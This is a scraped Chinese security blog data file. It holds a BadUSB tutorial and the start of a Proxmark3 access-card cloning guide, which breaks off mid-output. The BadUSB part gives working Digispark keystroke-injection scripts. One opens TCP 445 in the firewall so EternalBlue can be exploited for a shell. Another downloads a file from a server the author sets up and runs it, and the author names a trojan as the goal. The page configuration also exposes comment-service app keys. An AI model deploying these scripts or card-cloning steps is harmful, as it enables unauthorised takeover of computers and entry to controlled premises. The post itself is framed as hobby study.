height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大<br>","more":"</p>\n<h4 id=\"知识准备\"><a href=\"#知识准备\" class=\"headerlink\" title=\"知识准备\"></a>知识准备</h4><p><img src=\"/img/2018-06-12/badusb.png\" srcset=\"/img/static/loading.gif\" alt=\"badusb\"><br>&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦<br>&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。</p>\n<h5 id=\"一、U盘的结构\"><a href=\"#一、U盘的结构\" class=\"headerlink\" title=\"一、U盘的结构\"></a>一、U盘的结构</h5><p>&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下<br><pre><code class=\"hljs undefined\">|<span class=\"hljs-string\">--------</span>|<span class=\"hljs-string\">---------------</span>|\n|<span class=\"hljs-string\">  固件  </span>|<span class=\"hljs-string\">   数据存储区   </span>|\n|<span class=\"hljs-string\">--------</span>|<span class=\"hljs-string\">---------------</span>|</code></pre></p>\n<p> &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p>\n<h5 id=\"usb协议\"><a href=\"#usb协议\" class=\"headerlink\" title=\"usb协议\"></a>usb协议</h5><p>&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。<br>&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了<br><img src=\"/img/2018-06-12/xixixi.png\" srcset=\"/img/static/loading.gif\" alt=\"xixixi\"></p>\n<h5 id=\"入侵原理\"><a href=\"#入侵原理\" class=\"headerlink\" title=\"入侵原理\"></a>入侵原理</h5><p>正常的U盘插到电脑里的大概流程是下面这样的<br><pre><code class=\"hljs undefined\">           <span class=\"hljs-comment\">电脑识别为U盘的固件</span>\n<span class=\"hljs-comment\">固件信息</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">U盘</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">读取U盘的内容</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">示U盘的内容</span></code></pre></p>\n<p>构造badusb的固件让电脑识别为键盘<br><pre><code class=\"hljs undefined\">           电脑识别为键盘的固件\n固件信息<span class=\"hljs-comment\">--------------------------&gt;键盘</span></code></pre></p>\n<p>再构造里面的内容<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">键盘</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">模拟人敲命令</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">根据写好的脚本敲命令</span></code></pre></p>\n<h5 id=\"材料准备\"><a href=\"#材料准备\" class=\"headerlink\" title=\"材料准备\"></a>材料准备</h5><p>&emsp;&emsp;材料清单</p>\n<ul>\n<li>Digispark（也就是我们的主角）</li>\n<li>Arduino（编写以及把脚本写到badusb里的程序）</li>\n<li>脚本</li>\n</ul>\n<h4 id=\"开干\"><a href=\"#开干\" class=\"headerlink\" title=\"开干\"></a>开干</h4><h5 id=\"安装驱动\"><a href=\"#安装驱动\" class=\"headerlink\" title=\"安装驱动\"></a>安装驱动</h5><p>驱动下载地址，链接：<a href=\"http://pan.baidu.com/s/1i4K10dn\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1i4K10dn</a> 密码：ilaf<br><pre><code class=\"hljs undefined\">下载好后运行<span class=\"hljs-code\">`DPinst64.exe`</span>，32位系统点击<span class=\"hljs-code\">`DPinst.exe`</span>,一路回车等待安装完成\n下载编写程序的开发软件[<span class=\"hljs-string\">https://www.arduino.cc/en/Main/Software</span>](<span class=\"hljs-link\">https://www.arduino.cc/en/Main/Software</span>)\n运行Arduino，在首选项中添加开发板网址[<span class=\"hljs-string\">http://digistump.com/package_digistump_index.json</span>](<span class=\"hljs-link\">http://digistump.com/package_digistump_index.json</span>)(不同的板网址不同)</code></pre></p>\n<p><img src=\"/img/2018-06-12/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可<br><img src=\"/img/2018-06-12/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br><pre><code class=\"hljs undefined\">选择<span class=\"hljs-keyword\">Digispark开发板\n</span>编译器选择USBtinyISP</code></pre></p>\n<p><img src=\"/img/2018-06-12/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br><img src=\"/img/2018-06-12/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>到这里所有准备就做好了<br><img src=\"/img/2018-06-12/xixixi.png\" srcset=\"/img/static/loading.gif\" alt=\"xixixi\"></p>\n<h5 id=\"写脚本\"><a href=\"#写脚本\" class=\"headerlink\" title=\"写脚本\"></a>写脚本</h5><p>先看一眼商家给的教程<br><img src=\"/img/2018-06-12/jiaocheng.png\" srcset=\"/img/static/loading.gif\" alt=\"jiaocheng\"><br><img src=\"/img/2018-06-12/emmm.jpg\" srcset=\"/img/static/loading.gif\" alt=\"emmm...\"><br>在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]<br>算了，先一步一步跟着教程摸索下<br>最终代码如下，修改了一点点<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\n\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"cmd\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"echo\"</span>));\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" \"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233\"</span>));\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>编译…没问题,上传…O98k<br><img src=\"/img/2018-06-12/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>激动人心的时候到了，重新插进电脑去,10秒后…<br><img src=\"/img/2018-06-12/final.png\" srcset=\"/img/static/loading.gif\" alt=\"final\"><br><img src=\"/img/2018-06-12/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>到目前为止就算badusb就算做好了</p>\n<h4 id=\"进阶教程\"><a href=\"#进阶教程\" class=\"headerlink\" title=\"进阶教程\"></a>进阶教程</h4><p>上面只是简单的尝试，接下来要进行更高级的用法<br><img src=\"/img/2018-06-12/1.gif\" srcset=\"/img/static/loading.gif\" alt=\"gif\"><br>然鹅。。。。。<br><img src=\"/img/2018-06-12/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br><img src=\"/img/2018-06-12/9.jpg\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。<br>忽然想起当时买这个的时候有好多个版本。。。<br>我绝对不会告诉你我是因为它<b><del>比较便宜</del></b>体积小迷你好看才买它的<br>经过我一番沉思与实践之后<br>如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell<br>如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用<br>cmd开启445端口命令如下<br><pre><code class=\"hljs undefined\">netsh advfirewall<span class=\"hljs-built_in\"> firewall </span><span class=\"hljs-builtin-name\">add</span> rule <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-string\">\"open 445\"</span> <span class=\"hljs-attribute\">dir</span>=in <span class=\"hljs-attribute\">action</span>=allow <span class=\"hljs-attribute\">protocol</span>=TCP <span class=\"hljs-attribute\">localport</span>=445</code></pre></p>\n<p>编写好的脚本代码如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"cmd\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"netsh advfirewall firewall add rule name=\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">34</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"open445\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">34</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" dir=in protocol=tcp localport=445 action=allow\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell<br><img src=\"/img/2018-06-12/445.png\" srcset=\"/img/static/loading.gif\" alt=\"445\"><br>win10系统下载测试文件Team233.png的脚本代码如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"pow\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"$client = new-object System.Net.WebClient\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" $client.DownloadFile('http://192.168.1.2/Team233.png', '.\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">92</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233.png')\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\".\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">92</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233.png\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>效果就参考我录的视频吧<br>链接: <a href=\"https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ</a> 密码: c9he<br><b>未经允许不得传播</b><br><b>本文仅供学习之用，不负任何法律责任<b></b></b></p>"},{"title":"Proxmark3 Easy破解门禁卡学习过程","index_img":"/img/2018-07-26/Proxmark3.jpg","date":"2018-07-26T10:28:38.000Z","_content":"\n#### 前言\n&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。**真正有问题的不是安全，而是人心。**很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。\n<!--more-->\n#### 硬件准备\n##### 破解设备\nProxmark3 Easy\n![Proxmark3 Easy](/img/2018-07-26/Proxmark3.jpg)\n破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足\n![arc122u](/img/2018-07-26/arc122u.jpg)\n##### 各种卡\n准备一些ID，IC卡\n![ka](/img/2018-07-26/ka.jpg)\n这不都长一个样么（＃－.－）\n##### 区分ID卡和IC卡的方法\n1. 光照法\n![1](/img/2018-07-26/1.jpg)\n![2](/img/2018-07-26/2.jpg)\n圆形大多是ID卡，方形大多是IC卡\n2. NFC法\n拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡\n\n#### 知识准备\n&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里-->[传送门](https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&fromid=497249)，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有\n<style>\ntable th:first-of-type {  \n    width: 25%; \n}\ntable th:nth-of-type(2) {  \n    width: 7%; \n}\ntable th:nth-of-type(3) {  \n    width: 68%; \n}\n</style>\n\n|           类型              |   频率   |                                   特性                                        |\n| --------------------------|:-------:| ----------------------------------------------------------------------------|\n| Mifare S50(简称M1)          |   高频   |最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡  |\n| Mifare UltraLight（简称M0） |   高频   |低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡                        \t|\n| Mifare UID（简称UID卡）     |   高频   |M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据\t\t\t\t|\n| EM4XX（简称ID卡）           |   低频   |常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）      |\n| T5577（简称可修改ID卡）      |   低频   |可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码                 |\n| HID ProxⅡ（简称HID卡）     |   低频   |美国常用的低频卡，可擦写，不与其他卡通用                                           |\n\n##### 高频\n###### M1 S50卡\n&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。**每个扇区都有独立的一组密码及访问控制**，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B\n每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。\n```\n扇区0\t03332801198804008500b42ef0bb6aa8 块0\t \t//厂商代码，不可更改\n\t00000000000000000000000000000000 块1\t \t//数据块\n\t00000000000000000000000000000000 块2 \t\t//数据块\n\tffffffffffffff078069ffffffffffff 块3 \t\t//密码A（6字节），存储控制（4字节），密码B（6字节）\n\n扇区1\t00000000000000000000000000000000 块4 \t\t//出了第0扇区稍有不同，其他15个扇区结构完全一样\n\t00000000000000000000000000000000 块5\n\t00000000000000000000000000000000 块6\n\tffffffffffffff078069ffffffffffff 块7\n\t\t        .\n\t\t        .\n\t\t        .   \n扇区15\t00000000000000000000000000000000 块60\n\t00000000000000000000000000000000 块61\n\t00000000000000000000000000000000 块62\n\tffffffffffffff078069ffffffffffff 块63\n```\n&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。**密码不一定可以读取，由控制字决定。**\n###### M1 UID卡\n&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。\n###### FUID卡\n&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。**FUID可以修改0块，但只可以修改一次**，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。\n###### CUID卡\n&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过**指令**修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。\n##### 低频\n###### ID卡\n&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。\n###### T5577卡\n&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下\n```\n0x00148040  00000000000101001000000001000000 [0]\n0xFF94C004  11111111100101001100000000000100 [1]\n0xA5464942  10100101010001100100100101000010 [2]\n0xFFFFF808  11111111111111111111100000001000 [3]\n0x0001C000  00000000000000011100000000000000 [4]\n0x0001C000  00000000000000011100000000000000 [5]\n0x0001C000  00000000000000011100000000000000 [6]\n0x0001C000  00000000000000011100000000000000 [7]\n```\n#### 破解\n##### 破解ID卡\n###### 安装驱动\n驱动下载官网网址-->[传送门](https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10)\n安装驱动文件前需要禁用**驱动安装强制签名**，方法-->[传送门](https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html)\n驱动安装方法\n**我的电脑右键-->管理-->设备管理器-->端口下的设备右键-->更新驱动程序-->浏览我的计算机-->选择本地-->从磁盘安装--找到官方的驱动文件-->确认**\n驱动安装完成会显示图片上的样子，记住**COM端口**\n![4](/img/2018-07-26/4.png)\n###### 硬件使用方法\n**Proxmark3 Easy**\n![3](/img/2018-07-26/3.jpg)\n\n\t\t1 功能按钮\n\t\t2 ABCD工作状态指示灯\n\t\t3 USB接口\n\t\t4 电源指示灯\n\t\t5 低频读卡区\n\t\t6 高频读卡区\n&emsp;&emsp;功能按钮有`退出`、`取消`、`停止`、`强刷固件`的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。\n###### 破解方法\n**读卡片ID号→换上T5577卡→把ID号写入卡片→完成**\nID是没有密码只有卡号的，因此只要知道卡号就可以复制。\n软件资料包-->[密码: f8q4](https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w)\n打开`官方软件固件\\pm3-bin-2.5.0\\win32(client+GUI)\\Proxmark Tool.exe`，箭头所指选择刚刚驱动安装的那个`COM端口`，连接Proxmark3，接入电脑后，电源指示灯处`POW`亮蓝灯，`FULL`亮绿灯，`CHR`闪烁微弱红灯。\n![5](/img/2018-07-26/5.png)\n在`COMMAND TO SEND`里输入`hw tune`测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。\n```\nproxmark3> hw tune\nMeasuring antenna characteristics, please wait........          \n# LF antenna: 22.27 V @   125.00 kHz          \n# LF antenna: 31.76 V @   134.00 kHz          \n# LF optimal: 31.76 V @   133.33 kHz          \n# HF antenna: 20.17 V @    13.56 MHz          \nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\n```\n把低频ID卡（门禁卡）放到低频读卡区输入`lf search`获取ID卡的信息，把卡号抄下来，复制时要用\n```\nproxmark3> lf search\nReading 30000 bytes from device memory\nData fetched          \nSamples @ 8 bits/smpl, decimation 1:1           \nNOTE: some demods output possible binary\n  if it finds something that looks like a tag          \nFalse Positives ARE 